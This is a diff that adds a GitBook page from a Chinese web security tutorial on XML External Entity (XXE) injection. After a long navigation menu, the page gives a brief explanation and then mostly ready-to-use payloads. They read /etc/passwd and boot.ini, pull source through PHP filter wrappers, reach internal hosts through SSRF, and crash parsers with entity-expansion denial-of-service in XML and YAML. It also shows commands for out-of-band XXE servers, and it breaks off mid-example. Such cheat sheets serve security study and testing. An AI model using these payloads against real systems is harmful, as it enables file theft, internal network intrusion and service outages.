@@ -1,0 +1,1368 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>XML实体注入漏洞-XXE · GitBook</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        
+        
+        
+    
+    <link rel="stylesheet" href="../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="../模板注入-SSTI/" />
+    
+    
+    <link rel="prev" href="../SAML注入/" />
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../">
+            
+                <a href="../">
+            
+                    
+                    简介
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" data-path="../SUMMARY.html">
+            
+                <a href="../SUMMARY.html">
+            
+                    
+                    目录
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3" >
+            
+                <span>
+            
+                    
+                    web基础知识
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1" data-path="../http协议/">
+            
+                <a href="../http协议/">
+            
+                    
+                    http协议
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2" data-path="../常见中间件/README.md">
+            
+                <span>
+            
+                    
+                    常见的中间件，数据库
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.3" data-path="../使用docker搭建环境/">
+            
+                <a href="../使用docker搭建环境/">
+            
+                    
+                    使用docker搭建环境
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.4" data-path="../使用v2ray,shadowsock及tor/">
+            
+                <a href="../使用v2ray,shadowsock及tor/">
+            
+                    
+                    搭建梯子
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.5" data-path="../php基础-留言板/README.md">
+            
+                <span>
+            
+                    
+                    php基础-留言板
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.6" data-path="../python基础-查询api/">
+            
+                <a href="../python基础-查询api/">
+            
+                    
+                    python基础-查询api
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4" >
+            
+                <span>
+            
+                    
+                    前端安全
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.1" data-path="../跨站脚本攻击-XSS/">
+            
+                <a href="../跨站脚本攻击-XSS/">
+            
+                    
+                    跨站脚本攻击-XSS
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2" data-path="../跨站请求伪造-CSRF/">
+            
+                <a href="../跨站请求伪造-CSRF/">
+            
+                    
+                    跨站请求伪造-CSRF
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.3" data-path="../CORS配置错误/">
+            
+                <a href="../CORS配置错误/">
+            
+                    
+                    CORS配置错误
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.4" data-path="../Web缓存泄露/">
+            
+                <a href="../Web缓存泄露/">
+            
+                    
+                    Web缓存泄露
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5" >
+            
+                <span>
+            
+                    
+                    注入漏洞
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.5.1" data-path="../命令注入/">
+            
+                <a href="../命令注入/">
+            
+                    
+                    命令注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.2" >
+            
+                <span>
+            
+                    
+                    SQL注入
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.5.2.1" data-path="../SQL注入/">
+            
+                <a href="../SQL注入/">
+            
+                    
+                    MYSQL
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.2.2" data-path="../SQL注入/MSSQL.html">
+            
+                <a href="../SQL注入/MSSQL.html">
+            
+                    
+                    MSSQL
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.2.3" data-path="../SQL注入/PostgreSQL.html">
+            
+                <a href="../SQL注入/PostgreSQL.html">
+            
+                    
+                    PostgreSQL
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.2.4" data-path="../SQL注入/SQLite.html">
+            
+                <a href="../SQL注入/SQLite.html">
+            
+                    
+                    SQLite
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.3" data-path="../CRLF注入/">
+            
+                <a href="../CRLF注入/">
+            
+                    
+                    CRLF注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.4" data-path="../LDAP注入/">
+            
+                <a href="../LDAP注入/">
+            
+                    
+                    LDAP注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.5" data-path="../NoSQL注入/">
+            
+                <a href="../NoSQL注入/">
+            
+                    
+                    NoSQL注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.6" data-path="../XPATH注入/">
+            
+                <a href="../XPATH注入/">
+            
+                    
+                    XPATH注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.7" data-path="../SAML注入/">
+            
+                <a href="../SAML注入/">
+            
+                    
+                    SAML注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter active" data-level="1.5.8" data-path="./">
+            
+                <a href="./">
+            
+                    
+                    XML实体注入漏洞-XXE
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.9" data-path="../模板注入-SSTI/">
+            
+                <a href="../模板注入-SSTI/">
+            
+                    
+                    模板注入-SSTI
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6" >
+            
+                <span>
+            
+                    
+                    权限控制
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.6.1" data-path="../不安全的代码管理/">
+            
+                <a href="../不安全的代码管理/">
+            
+                    
+                    不安全的代码管理
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.2" data-path="../不安全的对象引用/">
+            
+                <a href="../不安全的对象引用/">
+            
+                    
+                    不安全的对象引用
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.3" data-path="../不安全的管理接口/">
+            
+                <a href="../不安全的管理接口/">
+            
+                    
+                    不安全的管理接口
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7" >
+            
+                <span>
+            
+                    
+                    文件相关漏洞
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.7.1" data-path="../文件上传漏洞/">
+            
+                <a href="../文件上传漏洞/">
+            
+                    
+                    文件上传漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.2" data-path="../文件包含/README.md">
+            
+                <span>
+            
+                    
+                    文件包含
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+        
+        <li class="divider"></li>
+        
+        
+    
+        <li class="chapter " data-level="2.1" >
+            
+                <span>
+            
+                    
+                    认证方式漏洞
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.1.1" data-path="../JWT安全问题/">
+            
+                <a href="../JWT安全问题/">
+            
+                    
+                    JWT安全问题
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.2" data-path="../OAuth认证/">
+            
+                <a href="../OAuth认证/">
+            
+                    
+                    OAuth认证
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2" >
+            
+                <span>
+            
+                    
+                    其他漏洞
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.2.1" data-path="../任意url跳转/">
+            
+                <a href="../任意url跳转/">
+            
+                    
+                    任意url跳转
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.2" data-path="../目录遍历/">
+            
+                <a href="../目录遍历/">
+            
+                    
+                    目录遍历
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.3" data-path="../服务端请求伪造-SSRF/">
+            
+                <a href="../服务端请求伪造-SSRF/">
+            
+                    
+                    服务端请求伪造-SSRF
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+        
+        <li class="divider"></li>
+        
+        
+    
+        <li class="chapter " data-level="3.1" >
+            
+                <span>
+            
+                    
+                    代码审计
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="3.1.1" data-path="../PHP弱类型/">
+            
+                <a href="../PHP弱类型/">
+            
+                    
+                    PHP弱类型
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="3.2" >
+            
+                <span>
+            
+                    
+                    内网渗透
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="3.2.1" >
+            
+                <span>
+            
+                    
+                    代理转发
+            
+                </span>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.2.2" >
+            
+                <span>
+            
+                    
+                    内网扫描
+            
+                </span>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="3.3" >
+            
+                <span>
+            
+                    
+                    红队知识
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="3.3.1" data-path="../内网技巧/域结构.html">
+            
+                <a href="../内网技巧/域结构.html">
+            
+                    
+                    域结构
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.3.2" data-path="../内网技巧/hash.html">
+            
+                <a href="../内网技巧/hash.html">
+            
+                    
+                    windows hash
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.3.3" data-path="../内网技巧/c2工具.html">
+            
+                <a href="../内网技巧/c2工具.html">
+            
+                    
+                    c2工具
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.3.4" data-path="../内网技巧/初始访问.html">
+            
+                <a href="../内网技巧/初始访问.html">
+            
+                    
+                    初始访问
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.3.5" data-path="../内网技巧/域信息搜集.html">
+            
+                <a href="../内网技巧/域信息搜集.html">
+            
+                    
+                    信息搜集
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.3.6" >
+            
+                <span>
+            
+                    
+                    代码执行
+            
+                </span>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.3.7" >
+            
+                <span>
+            
+                    
+                    权限提升
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="3.3.7.1" data-path="../内网技巧/本地提权.html">
+            
+                <a href="../内网技巧/本地提权.html">
+            
+                    
+                    本地提权
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.3.7.2" data-path="../内网技巧/域提权.html">
+            
+                <a href="../内网技巧/域提权.html">
+            
+                    
+                    域提权
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="3.3.8" data-path="../内网技巧/凭据获取.html">
+            
+                <a href="../内网技巧/凭据获取.html">
+            
+                    
+                    凭据获取
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.3.9" data-path="../内网技巧/横向移动.html">
+            
+                <a href="../内网技巧/横向移动.html">
+            
+                    
+                    横向移动
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.3.10" >
+            
+                <span>
+            
+                    
+                    痕迹清理
+            
+                </span>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.3.11" data-path="../内网技巧/权限维持.html">
+            
+                <a href="../内网技巧/权限维持.html">
+            
+                    
+                    权限维持
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.3.12" data-path="../内网技巧/无凭证情况.html">
+            
+                <a href="../内网技巧/无凭证情况.html">
+            
+                    
+                    无域凭证的情况
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.3.13" >
+            
+                <span>
+            
+                    
+                    多域
+            
+                </span>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href=".." >XML实体注入漏洞-XXE</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <h1 id="xml-external-entity">XML External entity</h1>
+<blockquote>
+<p>XML&#x5916;&#x90E8;&#x5B9E;&#x4F53;&#x653B;&#x51FB;&#x662F;&#x9488;&#x5BF9;&#x89E3;&#x6790;XML&#x8F93;&#x5165;&#x5E76;&#x5141;&#x8BB8;XML&#x5B9E;&#x4F53;&#x7684;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x7684;&#x653B;&#x51FB;&#x7C7B;&#x578B;&#x3002;XML&#x5B9E;&#x4F53;&#x53EF;&#x7528;&#x4E8E;&#x544A;&#x8BC9;XML&#x89E3;&#x6790;&#x5668;&#x5728;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x83B7;&#x53D6;&#x7279;&#x5B9A;&#x5185;&#x5BB9;&#x3002;</p>
+</blockquote>
+<p><strong>&#x5185;&#x90E8;&#x5B9E;&#x4F53;</strong>&#xFF1A;&#x5982;&#x679C;&#x53C2;&#x6570;&#x662F;&#x5728;DTD&#x4E2D;&#x58F0;&#x660E;&#x7684;&#xFF0C;&#x5B83;&#x88AB;&#x79F0;&#x4E3A;&#x5185;&#x90E8;&#x5B9E;&#x4F53;&#x3002;</p>
+<p>&#x8BED;&#x6CD5;&#xFF1A;<code>&lt;&#xFF01;&#x53C2;&#x6570;&#x540D;&#x79F0;&#x201C;&#x53C2;&#x6570;&#x503C;&#x201D;&gt;</code></p>
+<p><strong>&#x5916;&#x90E8;&#x5B9E;&#x4F53;</strong>&#xFF1A;&#x5982;&#x679C;&#x53C2;&#x6570;&#x5728;DTD&#x5916;&#x90E8;&#x58F0;&#x660E;&#xFF0C;&#x5219;&#x79F0;&#x4E3A;&#x5916;&#x90E8;&#x5B9E;&#x4F53;&#x3002;&#x7531;&#x201C;SYSTEM&#x201D;&#x6807;&#x8BC6;&#x3002;&#x8BED;&#x6CD5;&#xFF1A;<code>&lt;&#xFF01;&#x53C2;&#x6570;&#x540D;&#x79F0;&#x201C;&#x53C2;&#x6570;&#x503C;&#x201D;&gt;</code></p>
+<h2 id="&#x6982;&#x8981;">&#x6982;&#x8981;</h2>
+<ul>
+<li><a href="#tools">Tools</a></li>
+<li><a href="#detect-the-vulnerability">Detect the vulnerability</a></li>
+<li><a href="#read-file-content">Read file content</a></li>
+<li><a href="#php-wrapper-inside-xxe">PHP Wrapper inside XXE</a></li>
+<li><a href="#xxe-to-ssrf">XXE to SSRF</a></li>
+<li><a href="#deny-of-service">Deny of service</a></li>
+<li><a href="#blind-xxe---out-of-Band">Blind XXE - Out of Band</a><ul>
+<li><a href="#blind-xxe">Blind XXE</a></li>
+<li><a href="#xxe-oob-attack-yusonov---2013">XXE OOB Attack (Yunusov, 2013)</a></li>
+<li><a href="#xxe-oob-with-dtd-and-php-filter">XXE OOB with DTD and PHP filter</a></li>
+<li><a href="#xxe-oob-with-apache-karaf">XXE OOB with Apache Karaf</a></li>
+</ul>
+</li>
+<li><a href="#xxe-in-exotic-files">XXE in exotic files</a><ul>
+<li><a href="#xxe-inside-svg">XXE inside SVG</a></li>
+<li><a href="#xxe-inside-soap">XXE inside SOAP</a></li>
+<li><a href="#xxe-inside-docx-file">XXE inside DOCX file</a></li>
+</ul>
+</li>
+</ul>
+<h2 id="tools">Tools</h2>
+<ul>
+<li><p><a href="https://github.com/staaldraad/xxeserv" target="_blank">xxeftp</a></p>
+<pre><code>sudo ./xxeftp -uno 443 ./xxeftp -w -wps 5555
+</code></pre><ul>
+<li><p><a href="https://github.com/lc/230-OOB" target="_blank">230-OOB</a> &#x4EE5;&#x53CA;&#x901A;&#x8FC7; <a href="http://xxe.sh/" target="_blank">http://xxe.sh/</a></p>
+<pre><code>$ python3 230.py 2121
+</code></pre></li>
+</ul>
+</li>
+</ul>
+<h3 id="detect-the-vulnerability">Detect the vulnerability</h3>
+<p>&#x57FA;&#x672C;&#x5B9E;&#x4F53;&#x6D4B;&#x8BD5;&#xFF0C;&#x5F53;XML&#x89E3;&#x6790;&#x5668;&#x89E3;&#x6790;&#x5916;&#x90E8;&#x5B9E;&#x4F53;&#x65F6;&#xFF0C;&#x7ED3;&#x679C;&#x5E94;&#x8BE5;&#x5728;&#x201C;firstName&#x201D;&#x4E2D;&#x5305;&#x542B;&#x201C;John&#x201D;&#xFF0C;&#x5728;&#x201C;lastName&#x201D;&#x4E2D;&#x5305;&#x542B;&#x201C;Doe&#x201D;&#x3002;&#x5B9E;&#x4F53;&#x662F;&#x5728;&#x201C;DOCTYPE&#x201D;&#x5143;&#x7D20;&#x4E2D;&#x5B9A;&#x4E49;&#x7684;&#x3002;</p>
+<pre><code class="lang-xml"><span class="hljs-comment">&lt;!--?xml version=&quot;1.0&quot; ?--&gt;</span>
+<span class="hljs-meta">&lt;!DOCTYPE replace [&lt;!ENTITY example &quot;Doe&quot;&gt; ]&gt;</span>
+ <span class="hljs-tag">&lt;<span class="hljs-name">userInfo</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">firstName</span>&gt;</span>John<span class="hljs-tag">&lt;/<span class="hljs-name">firstName</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">lastName</span>&gt;</span>&amp;example;<span class="hljs-tag">&lt;/<span class="hljs-name">lastName</span>&gt;</span>
+ <span class="hljs-tag">&lt;/<span class="hljs-name">userInfo</span>&gt;</span>
+</code></pre>
+<p>&#x5411;&#x670D;&#x52A1;&#x5668;&#x53D1;&#x9001;xml&#x8D1F;&#x8F7D;&#x65F6;&#xFF0C;&#x8BBE;&#x7F6E;&#x8BF7;&#x6C42;&#x4E2D;&#x7684;&#x201C;Content Type:application/xml&#x201D;&#x53EF;&#x80FD;&#x4F1A;&#x6709;&#x5E2E;&#x52A9;&#x3002;</p>
+<h2 id="read-file-content">Read file content</h2>
+<p>&#x7ECF;&#x5178;&#x7684;XXE&#xFF0C;&#x6211;&#x4EEC;&#x8BD5;&#x56FE;&#x663E;&#x793A;&#x6587;&#x4EF6;<code>/etc/passwd&#x7684;&#x5185;&#x5BB9;</code></p>
+<pre><code class="lang-xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">&quot;1.0&quot;</span><span class="hljs-meta">?&gt;</span></span><span class="hljs-meta">&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM &apos;file:///etc/passwd&apos;&gt;]&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span>&amp;test;<span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span>
+</code></pre>
+<pre><code class="lang-xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">&quot;1.0&quot;</span><span class="hljs-meta">?&gt;</span></span>
+<span class="hljs-meta">&lt;!DOCTYPE data [
+&lt;!ELEMENT data (#ANY)&gt;
+&lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;
+]&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">data</span>&gt;</span>&amp;file;<span class="hljs-tag">&lt;/<span class="hljs-name">data</span>&gt;</span>
+</code></pre>
+<pre><code class="lang-xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;ISO-8859-1&quot;</span><span class="hljs-meta">?&gt;</span></span>
+  <span class="hljs-meta">&lt;!DOCTYPE foo [  
+  &lt;!ELEMENT foo ANY &gt;
+  &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">foo</span>&gt;</span>&amp;xxe;<span class="hljs-tag">&lt;/<span class="hljs-name">foo</span>&gt;</span>
+</code></pre>
+<pre><code class="lang-xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;ISO-8859-1&quot;</span><span class="hljs-meta">?&gt;</span></span>
+<span class="hljs-meta">&lt;!DOCTYPE foo [  
+  &lt;!ELEMENT foo ANY &gt;
+  &lt;!ENTITY xxe SYSTEM &quot;file:///c:/boot.ini&quot; &gt;]&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">foo</span>&gt;</span>&amp;xxe;<span class="hljs-tag">&lt;/<span class="hljs-name">foo</span>&gt;</span>
+</code></pre>
+<p>:warning:&#xFF1A;SYSTEM&#x548C;PUBLIC&#x51E0;&#x4E4E;&#x662F;&#x540C;&#x4E49;&#x8BCD;&#x3002;:</p>
+<pre><code class="lang-xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;ISO-8859-1&quot;</span><span class="hljs-meta">?&gt;</span></span>
+<span class="hljs-meta">&lt;!DOCTYPE foo [  
+  &lt;!ELEMENT foo ANY &gt;
+  &lt;!ENTITY xxe SYSTEM &quot;file:///c:/boot.ini&quot; &gt;]&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">foo</span>&gt;</span>&amp;xxe;<span class="hljs-tag">&lt;/<span class="hljs-name">foo</span>&gt;</span>
+</code></pre>
+<p>&#x7ECF;&#x5178;XXE Base64&#x7F16;&#x7801;</p>
+<pre><code class="lang-xml"><span class="hljs-meta">&lt;!DOCTYPE test [ &lt;!ENTITY % init SYSTEM &quot;data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk&quot;&gt; %init; ]&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">foo</span>/&gt;</span>
+</code></pre>
+<h2 id="php-wrapper-inside-xxe">PHP Wrapper inside XXE</h2>
+<pre><code class="lang-xml"><span class="hljs-meta">&lt;!DOCTYPE replace [&lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=index.php&quot;&gt; ]&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">contacts</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">contact</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>Jean &amp;xxe; Dupont<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">phone</span>&gt;</span>00 11 22 33 44<span class="hljs-tag">&lt;/<span class="hljs-name">phone</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">adress</span>&gt;</span>42 rue du CTF<span class="hljs-tag">&lt;/<span class="hljs-name">adress</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">zipcode</span>&gt;</span>75000<span class="hljs-tag">&lt;/<span class="hljs-name">zipcode</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">city</span>&gt;</span>Paris<span class="hljs-tag">&lt;/<span class="hljs-name">city</span>&gt;</span>
+  <span class="hljs-tag">&lt;/<span class="hljs-name">contact</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">contacts</span>&gt;</span>
+</code></pre>
+<pre><code class="lang-xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;ISO-8859-1&quot;</span><span class="hljs-meta">?&gt;</span></span>
+<span class="hljs-meta">&lt;!DOCTYPE foo [
+&lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY % xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=http://10.0.0.3&quot; &gt;
+]&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">foo</span>&gt;</span>&amp;xxe;<span class="hljs-tag">&lt;/<span class="hljs-name">foo</span>&gt;</span>
+</code></pre>
+<h2 id="xxe-to-ssrf">XXE to SSRF</h2>
+<p>XXE can be combined with the <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery" target="_blank">SSRF vulnerability</a> to target another service on the network.</p>
+<pre><code class="lang-xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;ISO-8859-1&quot;</span><span class="hljs-meta">?&gt;</span></span>
+<span class="hljs-meta">&lt;!DOCTYPE foo [
+&lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY % xxe SYSTEM &quot;http://secret.dev.company.com/secret_pass.txt&quot; &gt;
+]&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">foo</span>&gt;</span>&amp;xxe;<span class="hljs-tag">&lt;/<span class="hljs-name">foo</span>&gt;</span>
+</code></pre>
+<h2 id="deny-of-service">Deny of service</h2>
+<p>:warning:: &#x8FD9;&#x4E9B;&#x653B;&#x51FB;&#x53EF;&#x80FD;&#x4F1A;&#x6740;&#x6B7B;&#x670D;&#x52A1;&#x6216;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x4E0D;&#x8981;&#x5728;&#x751F;&#x4EA7;&#x4E2D;&#x4F7F;&#x7528;&#x5B83;&#x4EEC;&#x3002;</p>
+<pre><code class="lang-xml"><span class="hljs-meta">&lt;!DOCTYPE data [
+&lt;!ENTITY a0 &quot;dos&quot; &gt;
+&lt;!ENTITY a1 &quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;&gt;
+&lt;!ENTITY a2 &quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;&gt;
+&lt;!ENTITY a3 &quot;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&quot;&gt;
+&lt;!ENTITY a4 &quot;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&quot;&gt;
+]&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">data</span>&gt;</span>&amp;a4;<span class="hljs-tag">&lt;/<span class="hljs-name">data</span>&gt;</span>
+</code></pre>
+<p>Yaml &#x653B;&#x51FB;</p>
+<pre><code class="lang-xml">a: &amp;a [&quot;lol&quot;,&quot;lol&quot;,&quot;lol&quot;,&quot;lol&quot;,&quot;lol&quot;,&quot;lol&quot;,&quot;lol&quot;,&quot;lol&quot;,&quot;lol&quot;]
+b: &amp;b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
+c: &amp;c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
+d: &amp;d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
+e: &amp;e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
+f: &amp;f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
+g: &amp;g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
+h: &amp;h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
